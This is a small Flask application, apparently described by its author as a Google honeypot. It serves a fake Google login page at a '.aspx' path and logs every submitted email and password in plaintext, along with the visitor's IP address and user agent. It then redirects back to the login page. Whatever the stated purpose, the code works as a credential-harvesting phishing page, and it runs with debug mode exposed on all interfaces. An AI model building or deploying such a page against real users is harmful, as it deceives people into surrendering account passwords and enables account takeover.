from flask import Flask,redirect,render_template,request
import logging

logger = logging.getLogger('Google-HoneyPOT')
logger.setLevel(level=logging.INFO)
handler1 = logging.FileHandler('output.log')
handler2 = logging.StreamHandler()
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler1.setFormatter(formatter)
handler2.setFormatter(formatter)
logger.addHandler(handler1)
logger.addHandler(handler2)


def create_app(test_config=None):
    app = Flask(__name__,instance_relative_config=True)
    
    @app.route('/google/auth/login.aspx',methods=['GET'])
    def owa():
        return render_template("index.html")

    @app.route('/')
    def index():
        return redirect('/google/auth/login.aspx?')

    @app.route('/google/auth/auth.google',methods=['GET','POST'])
    def auth():
        useragent=request.headers.get('User-agent')
        ip = request.remote_addr
        print (useragent)
        print (ip)
        if request.method == 'GET':
            return redirect('/google/auth/login.aspx?redirect=1',302)
        else:
            username = ""
            password = ""
            if "email_inp" in request.form:
                username = request.form["email_inp"]
            if "pass_inp" in request.form:
                password = request.form["pass_inp"]
            print(username)
            logger.info(request.base_url+" | 帳號:"+username+" 密碼:"+password + " IP:" + ip + " header:"+useragent)
            return redirect('/google/auth/login.aspx?redirect=1',302)
    
    @app.errorhandler(404)
    def page_404(error):
        return render_template("error.html"),404    
    return app

if __name__ == '__main__':
    create_app().run(debug=True,port=8080,host="0.0.0.0")